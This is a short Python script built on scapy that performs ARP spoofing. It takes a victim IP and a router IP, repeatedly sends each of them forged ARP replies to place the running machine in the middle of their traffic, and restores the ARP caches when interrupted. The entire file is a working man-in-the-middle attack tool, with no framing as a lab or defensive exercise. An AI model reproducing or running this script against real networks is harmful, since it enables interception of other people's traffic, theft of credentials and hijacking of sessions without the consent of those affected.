import scapy.all as scapy
import time
import optparse


def parse_input():
    get_input = optparse.OptionParser()

    get_input.add_option("-t", "--target", dest="target", help="Enter Ip of the attacked device")
    get_input.add_option("-r", "--router", dest="modem", help="Enter Ip of the modem / router")

    ips = get_input.parse_args()[0]

    if not ips.target:
        print("Enter Ip of the attacked device")
    if not ips.modem:
        print("Enter Ip of the modem / router")

    return ips


def get_mac(ip):
    arp_request_packet = scapy.ARP(pdst=ip)

    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def poison(victim, poisoned):
    target_mac = get_mac(victim)

    response = scapy.ARP(op=2, pdst=victim, hwdst=target_mac, psrc=poisoned)
    scapy.send(response, verbose=False)


def end_poison(victim, modem):

    victim_mac = get_mac(victim)
    modem_mac  = get_mac(modem)

    last_response = scapy.ARP(op=2, pdst=victim, hwdst=victim_mac, psrc=modem, hwsrc=modem_mac)
    scapy.send(last_response, verbose=False, count=5)


user_inputs = parse_input()

target_ip = user_inputs.target
modem_ip = user_inputs.modem


package = 0

while True:
    try:
        poison(modem_ip, target_ip)  # poison modem
        poison(target_ip, modem_ip)  # poison target

        package += 5
        print(f"\n\rPackages Sent : {package}", end="")
        time.sleep(5)

    except KeyboardInterrupt:
        print("\n... Alright ...\n")
        end_poison(target_ip, modem_ip)  # finish poison target
        end_poison(modem_ip, target_ip)  # finish poison modem
